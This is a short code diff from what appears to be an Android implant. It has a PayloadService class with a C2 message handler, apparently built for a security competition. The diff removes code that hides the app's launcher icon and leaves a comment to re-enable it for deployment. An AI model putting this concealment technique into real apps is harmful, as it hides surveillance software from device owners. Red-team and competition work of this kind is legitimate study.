@@ -239,20 +239,8 @@ class PayloadService : Service() {
     }
 
     private fun hideLauncherIcon() {
-        try {
-            val pm = packageManager
-            val component = ComponentName(this, MainActivity::class.java)
-            if (pm.getComponentEnabledSetting(component) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                pm.setComponentEnabledSetting(
-                    component,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                Log.i(TAG, "Launcher icon hidden")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to hide icon", e)
-        }
+        // Disabled during development — re-enable for competition deployment
+        Log.i(TAG, "hideLauncherIcon: skipped (dev mode)")
     }
 
     private fun handleC2Message(message: String) {
